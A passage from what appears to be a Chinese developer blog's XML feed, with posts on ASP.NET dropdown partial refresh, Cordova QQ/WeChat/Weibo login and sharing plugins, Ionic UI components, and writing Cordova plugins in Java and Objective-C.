    <content type="text"><![CDATA[html中的服务器控件在asp.net框架中有一个asp:ScriptManager控件用此控件可进行html页面的局部刷新。代码如下：1234567891011121314&lt;asp:ScriptManager ID="ScriptManager2" runat="server"&gt;&lt;/asp:ScriptManager&gt; &lt;asp:UpdatePanel ID="UpdatePanel2" runat="server"&gt; &lt;ContentTemplate&gt; &lt;div&gt; &lt;label&gt;库别:&lt;/label&gt; &lt;asp:DropDownList ID="DropDownList1" runat="server" AutoPostBack="True" OnSelectedIndexChanged="DropDownList1_SelectedIndexChanged"&gt;&lt;/asp:DropDownList&gt; &lt;/div&gt; &lt;div&gt; &lt;label&gt;区域:&lt;/label&gt; &lt;asp:DropDownList ID="DropDownList2" runat="server"&gt;&lt;/asp:DropDownList&gt; &lt;label&gt;注意：该区域是与上选库别相关联的&lt;/label&gt; &lt;/div&gt; &lt;/ContentTemplate&gt; &lt;/asp:UpdatePanel&gt; csharp后台控制html中的前端局部刷新代码1234567891011121314151617protected void DropDownList1_SelectedIndexChanged(object sender, EventArgs e) &#123; DropDownList2.Items.Clear(); RegionDC regionDC = new RegionDC(); DataSet ds2 = regionDC.getRegion_nameBySub_name(DropDownList1.Items[DropDownList1.SelectedIndex].Text); int count = ds2.Tables[0].Rows.Count; if (ds2 != null) &#123; DropDownList2.DataSource = ds2.Tables[0].DefaultView; DropDownList2.DataValueField = "region_key"; DropDownList2.DataTextField = "region_name"; DropDownList2.DataBind(); &#125; else PageUtil.showAlert(this, "区域载入出错！"); DropDownList2.Items.Insert(0, "--选择区域--"); &#125; 下拉菜单初始化绑定1234567891011private void BindDrop() &#123; SubinventoryDC subDC = new SubinventoryDC(); DataSet ds1 = subDC.getAllUsedSubinventory_name(); DropDownList1.DataTextField = "subinventory_name"; DropDownList1.DataValueField = "subinventory_key"; DropDownList1.DataSource = ds1.Tables[0].DefaultView; DropDownList1.DataBind(); DropDownList1.Items.Insert(0, new ListItem("--选择库别--")); DropDownList2.Items.Insert(0, new ListItem("--选择区域--")); &#125;]]></content>
      <categories>
        <category>WMS</category>
        <category>csharp</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cordova QQ,微信,微博登录]]></title>
    <url>%2F2016%2F12%2F26%2Ffirst%2F</url>
    <content type="text"><![CDATA[介绍cordovaCordova是一个提供了一组相关设备的API，通过这些API，像hybirdapp混合式app可以通过JavaScript访问原生的设备，如摄像头，麦克风等等。 谈谈JS SDK Android SDK IOS SDKJS SDK表面上是最方便cordova项目实现的，但在授权时是通过网页的，其session还需要在网页上输入用户名密码来建立。Android SDK和IOS SDK的实现形式是通过调用本身已安装的第三方软件完成授权，显然后者比较牛。 第三方登录插件推荐QQ： https://github.com/iVanPan/Cordova_QQ微信：https://github.com/xu-li/cordova-plugin-wechat微博：https://github.com/iVanPan/cordova_weibo 实现方法1、准备工作，平台申请APPID，添加测试账号QQ：腾讯开放平台 http://open.qq.com/微信：微信开放平台 https://open.weixin.qq.com/微博：新浪微博开放平台 http://open.weibo.com/2、通过cordova添加插件注意：由于微信插件会改变根目录config.xml，所以我们需要伪造一个根目录的config.xml给它改（我的做法是从www里把config.xml复制一份出来根目录）QQ:1cordova plugin add https://github.com/iVanPan/Cordova_QQ.git --variable QQ_APP_ID=YOUR_QQ_APPID 微信:1cordova plugin add https://github.com/xu-li/cordova-plugin-wechat --variable wechatappid=YOUR_WECHAT_APPID 微博:1cordova plugin add https://github.com/iVanPan/cordova_weibo.git --variable WEIBO_APP_ID=YOUR_WEIBO_APPID 在这里我想说一下，微信太坑爹了，如果你的产品没有发布，或者没有签名什么的，他就不允许你用，我做的QQ,微博是可以用的。3、插件的进一步设置微博需要验证redirecturi，所以，如果在开放平台上有设置redirecturi，则需要在config.xml文件中加入以下属性：//YOUR_REDIRECT_URL替换为你在开放平台上设置的redirecturi 4、检查是否安装APP1234567891011121314YCQQ.checkClientInstalled(function()&#123; QQINSTALLED=true;&#125;,function()&#123; // if installed QQ Client version is not supported sso,also will get this error QQINSTALLED=false;&#125;);Wechat.isInstalled(function (installed) &#123; WEIXININSTALL=installed;&#125;);YCWeibo.checkClientInstalled(function()&#123; WEIBOINSTALL=true;&#125;,function()&#123; WEIBOINSTALL=false;&#125;); 在这里说一下，这个YCQQ可以直接拿来用，不需要依赖注入。如果你依赖注入会报错。5、界面实现第三方登录//QQ登录1234567var checkClientIsInstalled = 1;//default is 0,only for iOSYCQQ.ssoLogin(function(args)&#123; alert(args.access_token); alert(args.userid); &#125;,function(failReason)&#123; console.log(failReason);&#125;,checkClientIsInstalled); //微信登录1234567var scope = "snsapi_userinfo";Wechat.auth(scope, function (response) &#123; // you may use response.code to get the access token. alert(JSON.stringify(response));&#125;, function (reason) &#123; alert("Failed: " + reason);&#125;); //微博登录123456YCWeibo.ssoLogin(function(args)&#123; alert(args.access_token); alert(args.userid); &#125;,function(failReason)&#123; console.log(failReason);&#125;); 6、扩展，也可以第三方分享//QQ分享1234567891011var args = &#123;&#125;;args.url = "";args.title = "";args.description = "";args.imageUrl = "";args.appName = "";YCQQ.shareToQQ(function()&#123; console.log("share success");&#125;,function(failReason)&#123; console.log(failReason);&#125;,args); //微信分享//Wechat.Scene.TIMELINE 表示分享到朋友圈//Wechat.Scene.SESSION 表示分享给好友//（1）文本分享12345678Wechat.share(&#123; text: "This is just a plain string", scene: Wechat.Scene.TIMELINE // share to Timeline&#125;, function () &#123; alert("Success");&#125;, function (reason) &#123; alert("Failed: " + reason);&#125;); //(2)媒体分享12345678910111213141516Wechat.share(&#123; message: &#123; title: "Hi, there", description: "This is description.", thumb: "www/img/thumbnail.png", mediaTagName: "TEST-TAG-001", messageExt: "这是第三方带的测试字段", messageAction: "&lt;action&gt;dotalist&lt;/action&gt;", media: "YOUR_MEDIA_OBJECT_HERE" &#125;, scene: Wechat.Scene.TIMELINE // share to Timeline&#125;, function () &#123; alert("Success");&#125;, function (reason) &#123; alert("Failed: " + reason);&#125;); //(3)网页链接分享1234567891011121314Wechat.share(&#123; message: &#123; ... media: &#123; type: Wechat.Type.LINK, webpageUrl: "http://tech.qq.com/zt2012/tmtdecode/252.htm" &#125; &#125;, scene: Wechat.Scene.TIMELINE // share to Timeline&#125;, function () &#123; alert("Success");&#125;, function (reason) &#123; alert("Failed: " + reason);&#125;); //微博分享(仅支持网页链接)1234567891011var args = &#123;&#125;;args.url = "http://www.baidu.com";args.title = "Baidu";args.description = "This is Baidu";args.imageUrl = "https://www.baidu.com/img/bdlogo.png";//if you don't have imageUrl,for android http://www.sinaimg.cn/blog/developer/wiki/LOGO_64x64.png will be the defualt oneargs.defaultText = "";YCWeibo.shareToWeibo(function () &#123; alert("share success"); &#125;, function (failReason) &#123; alert(failReason); &#125;, args); 7、插件的改造（1）SESSION的删除，YC采用了session缓存access_token的方式，导致我遇到一个问题，未调用登出而更换了其他第三方账号，则不能重新授权，由于项目的特殊性，所以我决定把session去掉。方法如下：Android: YCQQ.java，查找 mTencent.isSessionValid() 并注释掉 if 和 else，只保留 else 中的代码IOS: YCQQ.m，查找 self.tencentOAuth.isSessionValid 并注释掉 if 和 else，只保留 else 中的代码（2）微博分享URL并不实用，分享出去只能显示“网页链接”四个字，并没有图片及简介，估计要走申请审核，不过我没有找到入口，于是我决定把webpage方式的分享改为文本方式，以下是代码：（js中定义 args 时也要把内容写到 content 中）Android: YCWeibo.java，查找1weiboMessage.mediaObject = getWebpageObj(params); 那一段，改为：1234567TextObject textObject = new TextObject();textObject.identify = Utility.generateGUID();try&#123; textObject.text = params.getString("content");&#125; catch(JSONException e)&#123;&#125;weiboMessage.mediaObject = textObject; IOS: YCWeibo.m，注释 WBWebpageObject 那部分，添加代码： message.text=[params objectForKey:@”content”];8、重新生成平台，手动修改插件后，需要重新生成平台版本（如果你有在其他地方有改过生成后的文件，请记得重新设置）1234cordova platform rm androidcordova platform rm ioscordova platform add androidcordova platform add ios 9、xcode需允许bitcode，因为新浪的库不符合build settings - &gt; all -&gt; 搜索 bitcode，把值改no10、xcode需做urltype的检查，有缺少则补充tencentopenapiURL Schemes: tencent+appidweiboURL Schemes: wb+appidweixinURL Schemes: appid]]></content>
      <categories>
        <category>cordova</category>
        <category>第三方登录</category>
      </categories>
      <tags>
        <tag>插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2016第52周总结]]></title>
    <url>%2F2016%2F12%2F26%2Fsecond%2F</url>
    <content type="text"><![CDATA[探索ionic轮播ionic轮播自带标签在ionic做的第一个轮播12345678910111213141516171819202122232425262728293031323334353637383940&lt;ion-view view-title="欢迎"&gt; &lt;ion-slide-box on-slide-changed="slideChanged(index)"&gt; &lt;ion-slide&gt; &lt;h3&gt;欢迎使用EffectWork&lt;/h3&gt; &lt;div id="logo"&gt; &lt;img src="img/effectwork.jpeg" alt="加载失败"&gt; &lt;/div&gt; &lt;p&gt; 专门为时间打造 &lt;/p&gt; &lt;p&gt; 开始我们每天的任务 &lt;/p&gt; &lt;/ion-slide&gt; &lt;ion-slide&gt; &lt;h3&gt;我们一起出发&lt;/h3&gt; &lt;div id="list"&gt; &lt;h5&gt;时间&lt;/h5&gt; &lt;ol&gt; &lt;li&gt;生活要以快乐为基准爱情要以互惠为原则&lt;/li&gt; &lt;li&gt;爱情不是空中楼阁，它是需要强大的物质基础来做地基做保障的。&lt;/li&gt; &lt;li&gt;时间一直在这里，流逝的是我们自己。&lt;/li&gt; &lt;/ol&gt; &lt;/div&gt; &lt;/ion-slide&gt; &lt;ion-slide&gt; &lt;h3&gt;来到我的时间&lt;/h3&gt; &lt;p&gt; 不要浪费你的生命在你一定会后悔的地方上。 &lt;/p&gt; &lt;div class="login"&gt; &lt;button class="button button-outline button-positive" ng-click="log()"&gt;登录&lt;/button&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;button class="button button-outline button-positive" ng-click="reg()"&gt;注册&lt;/button&gt; &lt;/div&gt; &lt;/ion-slide&gt; &lt;/ion-slide-box&gt; &lt;/ion-view&gt; 利用了 标签来制作ionic轮播。 探索ionic视图设定这个可以称前端的视图路由我采用了$urlRouterProvider,$stateProvider两个服务进行视图路由及视图与控制器的绑定。具体代码如下123456789101112131415161718192021222324252627282930313233343536373839404142angular.module('EffectWork.routes',[]).config(function($urlRouterProvider,$stateProvider)&#123; $stateProvider //欢迎界面 .state('splash', &#123; //splash路由名称 url: '/splash', //前端路由一般就是#/splash cache: false, //是否缓存 templateUrl: 'views/splash_screen/splash.html', //视图 controller: 'splashCtrl' //控制器 &#125;) .state('login',&#123; url:'/login', templateUrl:'views/login.html', controller:'loginCtrl' &#125;) .state('register',&#123; url:'/register', templateUrl:'views/register.html', controller:'registerCtrl' &#125;) .state('forget',&#123; url:'/forget', templateUrl:'views/forget.html', controller:'forgetCtrl' &#125;) .state("tab", &#123; url: "/tab", abstract: true, templateUrl: "views/tabs.html", controller:"tabCtrl" &#125;) .state('tab.home', &#123; url: '/home', views: &#123; 'tab-home': &#123; templateUrl: 'views/tab-home.html', controller: "homeCtrl" &#125; &#125; &#125;) $urlRouterProvider.otherwise("/splash"); //默认前端路由/splash&#125;) 路由跳转采用$state服务利用$state服务的go()方法，参数为指定路由名称。具体代码如下：123456789angular.module('EffectWork.controllers').controller('splashCtrl',['$scope','$state',function($scope,$state)&#123; $scope.log=function()&#123; $state.go('login'); &#125;; $scope.reg=function()&#123; $state.go('register'); &#125;;&#125;]) 关于键盘窗口挡住输入框我所有的输入表单都用包括，然后加上属性delegate-handle=””即可进行页面滑动，可以不挡住输入框，至于还有另一种方法，就是利用keyboard插件，进行键盘事件监控。我采用了第一种，目前还没出现问题。123456789101112131415161718192021222324252627282930&lt;ion-view view-title="找回密码"&gt; &lt;div class="bar bar-header bar-calm"&gt; &lt;h1 class="title"&gt;找回密码&lt;/h1&gt;&lt;/div&gt;&lt;ion-content class="rj-stable-content" delegate-handle="findPwd" id="findPassword"&gt;&lt;div class="list list-inset has-header"&gt;&lt;label class="item item-input"&gt; &lt;input type="text" placeholder="手机号"&gt; &lt;/label&gt; &lt;label class="item item-input"&gt; &lt;input type="password" placeholder="密码"&gt; &lt;/label&gt; &lt;label class="item item-input"&gt; &lt;input type="password" placeholder="再次输入密码"&gt; &lt;/label&gt; &lt;label class="item item-input item-input-inset"&gt; &lt;input type="text" placeholder="输入验证码"&gt; &lt;button class="button button-outline button-calm" style="height:10px;"&gt; 获取验证码 &lt;/button&gt; &lt;/label&gt; &lt;button class="button button-block button-calm" ng-click="findPwd()"&gt; 找回密码&lt;/button&gt;&lt;button class="button button-clear button-positive" style="text-decoration:underline;" ng-click="backLogin()"&gt; 返回&lt;/button&gt;&lt;/div&gt;&lt;/ion-content&gt;&lt;/ion-view&gt; 关于ionic上拉菜单样式问题ionic上拉菜单样式会有一些问题，导致很不好看，具体做法是把我下面的代码加入style.css123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127.platform-android .action-sheet-backdrop &#123; -webkit-transition: background-color 150ms ease-in-out; transition: background-color 150ms ease-in-out; position: fixed; top: 0; left: 0; z-index: 11; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0);&#125;.platform-android .action-sheet-backdrop.active &#123; background-color: rgba(0, 0, 0, 0.4);&#125;.platform-android .action-sheet-wrapper &#123; -webkit-transform: translate3d(0, 100%, 0); transform: translate3d(0, 100%, 0); -webkit-transition: all cubic-bezier(0.36, 0.66, 0.04, 1) 500ms; transition: all cubic-bezier(0.36, 0.66, 0.04, 1) 500ms; position: absolute; bottom: 0; left: 0; right: 0; width: 100%; max-width: 500px; margin: auto;&#125;.platform-android .action-sheet-up &#123; -webkit-transform: translate3d(0, 0, 0); transform: translate3d(0, 0, 0);&#125;.platform-android .action-sheet &#123; margin-left: 8px; margin-right: 8px; width: auto; z-index: 11; overflow: hidden;&#125;.platform-android .action-sheet .button &#123; display: block; padding: 1px; width: 100%; border-radius: 0; border-color: #d1d3d6; background-color: transparent; color: #007aff; font-size: 21px;&#125;.platform-android .action-sheet .button:hover &#123; color: #007aff;&#125;.platform-android .action-sheet .button.destructive &#123; color: #ff3b30;&#125;.platform-android .action-sheet .button.destructive:hover &#123; color: #ff3b30;&#125;.platform-android .action-sheet .button.active, .platform-android .action-sheet .button.activated &#123; box-shadow: none; border-color: #d1d3d6; color: #007aff; background: #e4e5e7;&#125;.platform-android .action-sheet-has-icons .icon &#123; position: absolute; left: 16px;&#125;.platform-android .action-sheet-title &#123; padding: 16px; color: #8f8f8f; text-align: center; font-size: 13px;&#125;.platform-android .action-sheet-group &#123; margin-bottom: 8px; border-radius: 4px; background-color: #fff; overflow: hidden;&#125;.platform-android .action-sheet-group .button &#123; border-width: 1px 0px 0px 0px;&#125;.platform-android .action-sheet-group .button:first-child:last-child &#123; border-width: 0;&#125;.platform-android .action-sheet-options &#123; background: #f1f2f3;&#125;.platform-android .action-sheet-cancel .button &#123; font-weight: 500;&#125;.platform-android .action-sheet-open &#123; pointer-events: none;&#125;.platform-android .action-sheet-open.modal-open .modal &#123; pointer-events: none;&#125;.platform-android .action-sheet-open .action-sheet-backdrop &#123; pointer-events: auto;&#125;.platform-android .action-sheet .action-sheet-title, .platform-android .action-sheet .button &#123; text-align: center;&#125;.platform-android .action-sheet-cancel &#123; display: block;&#125; 即可解决 关于标签利用ionic 即可制作tab导航。具体代码如下1234567891011121314&lt;ion-tabs class="tabs-icon-top tabs-color-active-balanced"&gt; &lt;ion-tab title="首页" icon-on="ion-ios-home positive" icon-off="ion-ios-home-outline" ui-sref="tab.home"&gt; &lt;ion-nav-view animation="slide-left-right" name="tab-home"&gt;&lt;/ion-nav-view&gt; &lt;/ion-tab&gt; &lt;ion-tab title="番茄钟" icon-on="ion-ios-clock positive" icon-off="ion-ios-clock-outline" ui-sref="tab.school"&gt; &lt;ion-nav-view animation="slide-left-right" name="tab-school"&gt;&lt;/ion-nav-view&gt; &lt;/ion-tab&gt; &lt;ion-tab title="消息" icon-on="ion-ios-chatbubble positive" icon-off="ion-ios-chatbubble-outline" ui-sref="tab.message"&gt; &lt;ion-nav-view animation="slide-left-right" name="tab-message"&gt;&lt;/ion-nav-view&gt; &lt;/ion-tab&gt; &lt;!-- &lt;ion-tab title="我的" icon-on="ion-ios-person positive" icon-off="ion-ios-person-outline"&gt; &lt;ion-nav-view animation="slide-left-right" name="tab-me"&gt;&lt;/ion-nav-view&gt; &lt;/ion-tab&gt; --&gt;&lt;/ion-tabs&gt; 关于ionic侧栏菜单利用ionic 具体代码如下:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;ion-side-menus&gt; &lt;ion-side-menu-content drag-content="true"&gt; &lt;ion-header-bar align-title="center" class="bar-stable bar-calm"&gt; &lt;div class="buttons"&gt; &lt;button class="button no-animation button-icon icon ion-ios-list-outline" ng-click="toggleLeft()"&gt; &lt;/button&gt; &lt;/div&gt; &lt;div class="wodivh1 title"&gt;EffectWork&lt;/div&gt; &lt;div class="buttons"&gt; &lt;button class="button no-animation button-icon icon ion-ios-plus-outline"&gt; &lt;/button&gt; &lt;/div&gt;&lt;/ion-header-bar&gt;&lt;ion-tabs class="tabs-icon-top tabs-color-active-balanced"&gt; &lt;ion-tab title="首页" icon-on="ion-ios-home positive" icon-off="ion-ios-home-outline" ui-sref="tab.home"&gt; &lt;ion-nav-view animation="slide-left-right" name="tab-home"&gt;&lt;/ion-nav-view&gt; &lt;/ion-tab&gt; &lt;ion-tab title="番茄钟" icon-on="ion-ios-clock positive" icon-off="ion-ios-clock-outline" ui-sref="tab.school"&gt; &lt;ion-nav-view animation="slide-left-right" name="tab-school"&gt;&lt;/ion-nav-view&gt; &lt;/ion-tab&gt; &lt;ion-tab title="消息" icon-on="ion-ios-chatbubble positive" icon-off="ion-ios-chatbubble-outline" ui-sref="tab.message"&gt; &lt;ion-nav-view animation="slide-left-right" name="tab-message"&gt;&lt;/ion-nav-view&gt; &lt;/ion-tab&gt; &lt;!-- &lt;ion-tab title="我的" icon-on="ion-ios-person positive" icon-off="ion-ios-person-outline"&gt; &lt;ion-nav-view animation="slide-left-right" name="tab-me"&gt;&lt;/ion-nav-view&gt; &lt;/ion-tab&gt; --&gt;&lt;/ion-tabs&gt; &lt;/ion-side-menu-content&gt; &lt;ion-side-menu side="left" width="280" style="background-color:#4a87ee;"&gt; &lt;ion-content class="rj-stable-content" delegate-handle="sideScroll" id="userRegister"&gt; &lt;img class="radioImg" src="img/effectwork.jpeg"&gt;&lt;div class="row"&gt; &lt;div class="col col-33 col-top"&gt;&lt;/div&gt; &lt;div class="col col-33 col-center word"&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt; &lt;div class="col col-33 col-bottom"&gt;&lt;span class="badge badge-calm"&gt;签到&lt;/span&gt;&lt;/div&gt; &lt;div class="col"&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/div&gt;&lt;/div&gt;&lt;/br&gt;&lt;div class="row"&gt; &lt;div class="col word"&gt;金币:&#123;&#123;money&#125;&#125;&lt;/div&gt;&lt;/div&gt;&lt;div class="row"&gt; &lt;div class="col word"&gt;签名:时间一直在这里，流逝的是我们自己。&lt;/div&gt;&lt;/div&gt; &lt;div class="list"&gt; &lt;button class="item button icon-left ion-ios-cog-outline button-calm button-block"&gt;我的资料&lt;/button&gt; &lt;button class="item button icon-left ion-ios-browsers-outline button-calm button-block"&gt;任务箱&lt;/button&gt; &lt;button class="item button icon-left ion-ios-filing-outline button-calm button-block"&gt;统计情况&lt;/button&gt; &lt;button class="item button icon-left ion-ios-paper-outline button-calm button-block"&gt;设置&lt;/button&gt; &lt;/div&gt; &lt;/ion-content&gt; &lt;/ion-side-menu&gt;&lt;/ion-side-menus&gt; 关于angularjs控制器传递数据这个我现在不是特别全面,我目前采用的是\$rootScope和angularjs服务依赖注入传递数据，为什么用这两种，第一是\$rootScope的作用域，第二是服务在整个应用中的生命周期。肯定还有其他方法，可以去尝试。还有一种方法是通过$state传递参数，但是我屡试不爽。这个没做成功。 关于cordova插件制作我说这个是因为我觉得光用别人的插件，有好多限制啊，所以我想自己做。但是这个要做的话，要对Android，ios，windowsIphone开发要了解一点。1、先说一下搭建cordova插件开发的环境吧nodejs肯定是要安装的然后全局安装cordova1npm install -g cordova 另外Android sdk肯定是要安装的，因为我们就是针对Android的sdk进行第三方开发。如果都安装好了，让我们开始吧！2、创建第一个应用1cordova create hello com.cool.hello HelloWorld 又是helloworld，你好世界！让我来解释一下参数吧第一个参数hello表示在工程目录中创建一个 hello 的文件夹第二个参数com.cool.hello表示包名（反向域名），用于标志不同的 app第三个参数HelloWorld表示项目的名称，可以在 config.xml 文件中修改3、添加平台进入创建的项目目录查看已有的凭条1$ cordova platforms list 添加所需要的平台1$ cordova platform add android 如果想移除已经添加的平台的话cordova platform remove android 或者cordova platform rm android4、编译项目编译项目命令1$ cordova build android 5、运行项目1$ cordova run android 6、前面都是测试，我们这才开始插件开发安装pluman1$ npm install -g plugman plugman安装完之后就可以创建一个插件了1$ cordova plugin plugman create --name --plugin_id --plugin_version [--path] [--variableName=VALUE] 解释参数：pluginName: 插件名字pluginID: 插件id, egg:coolPluginoversion: 版本, egg : 0.0.1directory:一个绝对或相对路径的目录，该目录将创建插件项目variable NAME=VALUE: 额外的描述，如作者信息和相关描述生成插件的目录123456789ExtraInfo├── src| ├── android| | └── ExtraInfo.java| ├── ios| └── ...├── www| └── ExtraInfo.js└── plugin.xml 这里的 src 对应不同的平台，www 放我们的 javascript 文件，plugin.xml 是插件的配置文件。接下来就说配置文件plugin.xml123456789101112131415161718&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;plugin id="cn.net.wenzhixin.cordova" version="0.0.1" xmlns="http://apache.org/cordova/ns/plugins/1.0" xmlns:android="http://schemas.android.com/apk/res/android"&gt; &lt;name&gt;ExtraInfo&lt;/name&gt; &lt;description&gt;Description&lt;/description&gt; &lt;js-module name="ExtraInfo" src="www/ExtraInfo.js"&gt; &lt;clobbers target="cordova.plugins.ExtraInfo"/&gt; &lt;/js-module&gt; &lt;platform name="android"&gt; &lt;config-file parent="/*" target="res/xml/config.xml"&gt; &lt;feature name="ExtraInfo"&gt; &lt;param name="android-package" value="cn.net.wenzhixin.cordova.ExtraInfo"/&gt; &lt;/feature&gt; &lt;/config-file&gt; &lt;source-file src="src/android/ExtraInfo.java" target-dir="src/cn/net/wenzhixin/cordova"/&gt; &lt;/platform&gt;&lt;/plugin&gt; 有几个关键的字段需要解释下： id: 插件的标识，即发布到 plugins.cordova.io 的 ID name：插件的名称 description：描述信息 js-module：对应我们的 javascript 文件，src 属性指向 www/ExtraInfo.js platform：支持的平台，这里仅仅用到了 android下面这句123&lt;js-module src="www/barcodescanner.js" name="BarcodeScanner"&gt; &lt;clobbers target="cordova.plugins.barcodeScanner" /&gt; &lt;/js-module&gt; 这里很重要， 它指明了 插件的原始 js 文件放在哪里，clobbers target有用。等会用到，这会我们把它叫做 clobbers123456&lt;config-file parent="/*" target="res/xml/config.xml"&gt; &lt;feature name="ExtraInfo"&gt; &lt;param name="android-package" value="cn.net.wenzhixin.cordova.ExtraInfo"/&gt; &lt;/feature&gt;&lt;/config-file&gt;&lt;source-file src="src/android/ExtraInfo.java" target-dir="src/cn/net/wenzhixin/cordova"/&gt; 这里是插件的配置信息，最后会添加到 res/xml/config.xml 文件中，并且将我们的 src/android/ExtraInfo.java，复制到 android 的 package 包中。feature name=”BarcodeScanner” 表示服务名为BarcodeScanner 。 记住这个服务名，有用.value=”HXBarcodeScanner” 对应的.m文件中插件的类名 helloPlugin.js配置12345678910111213141516171819202122var exec = require('cordova/exec');var myFunc = function()&#123;&#125;; // arg1：成功回调// arg2：失败回调// arg3：将要调用类配置的标识// arg4：调用的原生方法名// arg5：参数，json格式myFunc.prototype.showToast=function(success, error) &#123; exec(success, error, "CoolToast", "showToast", []);&#125;; myFunc.prototype.showshowToast=function(text, lenth,success, error) &#123; exec(success, error, "CoolToast", "showshowToast", [text, lenth]);&#125;;myFunc.prototype.openActivity=function() &#123; exec(null, null, "CoolToast", "openActivity", []);&#125;;var showt = new myFunc();module.exports = showt; 最后还有一个java类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.cool.toast; import org.apache.cordova.CallbackContext;import org.apache.cordova.CordovaPlugin;import org.json.JSONArray;import org.json.JSONException;import com.example.hello.TestActivity;import android.content.Intent;import android.widget.Toast; public class ShowToast extends CordovaPlugin &#123; @Overridepublic boolean execute(String action, JSONArray args, CallbackContext callbackContext) throws JSONException &#123;// TODO Auto-generated method stubif("showToast".equals(action))&#123;Toast.makeText(cordova.getActivity(), "show...", Toast.LENGTH_SHORT).show();callbackContext.success("success");return true;&#125;else if("showshowToast".equals(action))&#123;String str = args.getString(0);int len = args.getInt(1); if(len == 0)&#123;Toast.makeText(cordova.getActivity(), str, Toast.LENGTH_SHORT).show();callbackContext.success("success" + str);return true;&#125;else&#123;Toast.makeText(cordova.getActivity(), str, Toast.LENGTH_LONG).show();callbackContext.success("success" + str);return true;&#125;&#125;else if("openActivity".equals(action))&#123;openActivity();callbackContext.success("success");return true;&#125; callbackContext.error("error"); return false; &#125; private void openActivity() &#123;Intent intent = new Intent(cordova.getActivity(),TestActivity.class);cordova.getActivity().startActivity(intent);&#125; &#125; 继承了 CordovaPlugin 类，并重写 execute 方法，使用 action 来判断我们在 javascript 中调用的方法名，成功的话调用 callbackContext.success(message)，失败调用 callbackContext.error(message) 方法，分别对应 javascript 文件中的 success 和 error 回调函数。当然，这里只用到 android 平台，其他的平台也是一样的，ios 使用 object-c、wp7 使用 c# 语言，例子见Plugin Development Guide。7、插件安装我的插件所在的路径是F:\CoolPlugin 首先切换到最初创建的hello目录 cd hello 执行插件安装命令cordova plugin addF:\CoolPlugin 执行完之后你就发现插件已经安装上去了8、插件的使用12345678cool.toast.showToast(); cool.toast.showshowToast("hello",0, function(msg) &#123; alert(msg); &#125;, function(msg) &#123; alert(msg); &#125;); cool.toast.openActivity(); 这样就可以成功调用了。7、最后还是说说这个插件开发我认为就分两个一个是JavaScript interface12345cordova.exec(function(winParam) &#123;&#125;, function(error) &#123;&#125;, "service", "action", ["firstArgument", "secondArgument", 42, false]); 参数意义：1.成功的回调函数 2.失败的回调函数 3.native端的名称 4.native端的action名称 5.参数这是翻译的，看一下原文 function(winParam) {}: A success callback function. Assuming yourexec call completes successfully, this function executes alongwith any parameters you pass to it. function(error) {}: An error callback function. If the operationdoes not complete successfully, this function executes with anoptional error parameter. “service”: The service name to call on the native side. Thiscorresponds to a native class, for which more information isavailable in the native guides listed below. “action”: The action name to call on the native side. Thisgenerally corresponds to the native class method. See the nativeguides listed below. [/ arguments /]: An array of arguments to pass into the nativeenvironment.官方示例:12345window.echo = function(str, callback) &#123; cordova.exec(callback, function(err) &#123; callback('Nothing to echo.'); &#125;, "Echo", "echo", [str]); &#125;; 123window.echo("echome", function(echoValue) &#123; alert(echoValue == "echome"); // should alert true. &#125;); 第二个就是native interface上面说的都是Android的这里说IOS吧首先，是config.xml文件中需要配置1234567&lt;platform name="ios"&gt; &lt;config-file target="config.xml" parent="/*"&gt; &lt;feature name="Echo"&gt; &lt;param name="ios-package" value="Echo" /&gt; &lt;/feature&gt; &lt;/config-file&gt; &lt;/platform&gt; 注意点：1.feature name要与exec中的service对应 2.param value要与exec中的action对应 3.param name要写成ios-package其次，object-c的class要继承CDVPlugin官方示例:123456789101112131415161718192021222324252627282930313233/********* Echo.h Cordova Plugin Header *******/ #import &lt;Cordova/CDV.h&gt; @interface Echo : CDVPlugin - (void)echo:(CDVInvokedUrlCommand*)command; @end /********* Echo.m Cordova Plugin Implementation *******/ #import "Echo.h" #import &lt;Cordova/CDV.h&gt; @implementation Echo - (void)echo:(CDVInvokedUrlCommand*)command &#123; CDVPluginResult* pluginResult = nil; //获取exec中传过来的参数 NSString* echo = [command.arguments objectAtIndex:0]; if (echo != nil &amp;&amp; [echo length] &gt; 0) &#123; //返回成功，messageAsString将数据返回到JavaScript。 pluginResult = [CDVPluginResult resultWithStatus:CDVCommandStatus_OK messageAsString:echo]; &#125; else &#123; //返回失败。 pluginResult = [CDVPluginResult resultWithStatus:CDVCommandStatus_ERROR]; &#125; //将结果发送给&lt;code&gt;self.commandDelegate&lt;/code&gt;，这样会执行JavaScript side的成功或失败方法。 [self.commandDelegate sendPluginResult:pluginResult callbackId:command.callbackId]; &#125; @end 这就是cordova插件开发。 关于tabs无法置底的问题在应用的.config1234$ionicConfigProvider.platform.ios.tabs.style('standard'); $ionicConfigProvider.platform.ios.tabs.position('bottom'); $ionicConfigProvider.platform.android.tabs.style('standard'); $ionicConfigProvider.platform.android.tabs.position('standard'); 关于ionic退回按钮代码如下:1234567891011121314151617181920212223242526272829$ionicPlatform.registerBackButtonAction(function (e) &#123; //判断处于哪个页面时双击退出 if ($location.path() == '/tab/home') &#123; if ($rootScope.backButtonPressedOnceToExit) &#123; ionic.Platform.exitApp(); &#125; else &#123; $rootScope.backButtonPressedOnceToExit = true; $cordovaToast.showLongBottom('再按一次退出系统'); setTimeout(function () &#123; $rootScope.backButtonPressedOnceToExit = false; &#125;, 2000); &#125; &#125; else if ($ionicHistory.backView()) &#123; $ionicHistory.goBack(); &#125; else &#123; if ($rootScope.backButtonPressedOnceToExit) &#123; ionic.Platform.exitApp(); &#125; else&#123; $rootScope.backButtonPressedOnceToExit = true; $cordovaToast.showLongBottom('再按一次退出系统'); setTimeout(function () &#123; 